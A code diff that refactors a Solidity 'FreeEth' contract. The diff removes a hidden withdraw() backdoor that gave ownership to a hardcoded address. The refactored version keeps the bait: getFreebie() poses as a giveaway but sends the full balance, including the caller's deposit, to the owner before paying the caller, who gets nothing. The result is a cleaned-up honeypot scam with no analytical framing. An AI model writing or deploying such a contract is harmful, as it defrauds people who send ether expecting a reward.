@@ -1,0 +1,64 @@
+  pragma solidity ^0.4.19;
+  
+  contract FreeEth {
+-     address public Owner = msg.sender;
+?                    ^    -------------
++     address public owner;
+?                    ^
++ 
++     function FreeEth() public {
++         owner = msg.sender;
++     }
+  
+      function() public payable {}
+  
+-     function GetFreebie() public payable {
+?              ^
++     function getFreebie() public payable {
+?              ^
+-         if (msg.value > 1 ether) {
+?          ^^                     ^^
++         require(msg.value > 1 ether);
+?         ++++ ^^                     ^
+-             Owner.transfer(this.balance);
+?         ^^^^^
++         owner.transfer(this.balance);
+?         ^
+-             msg.sender.transfer(this.balance);
+? ----
++         msg.sender.transfer(this.balance);
+-         }
+      }
+  
+-     function withdraw() public payable {
+?                                --------
++     function withdraw() public {
+-         if (msg.sender == 0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af) {
+-             Owner = 0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af;
+-         }
+-         require(msg.sender == Owner);
+?                               ^
++         require(msg.sender == owner);
+?                               ^
+-         Owner.transfer(this.balance);
+?         ^
++         owner.transfer(this.balance);
+?         ^
+      }
+  
+-     function Command(address adr, bytes data) public payable {
+?              ^                -
++     function command(address target, bytes data) public payable {
+?              ^               +  +++
+-         require(msg.sender == Owner);
+?                               ^
++         require(msg.sender == owner);
+?                               ^
+- 
+-         adr.call.value(msg.value)(data);
+?          -
++         require(target.call.value(msg.value)(data));
+?         +++++++++  +++                            +
+      }
+- }
++ }
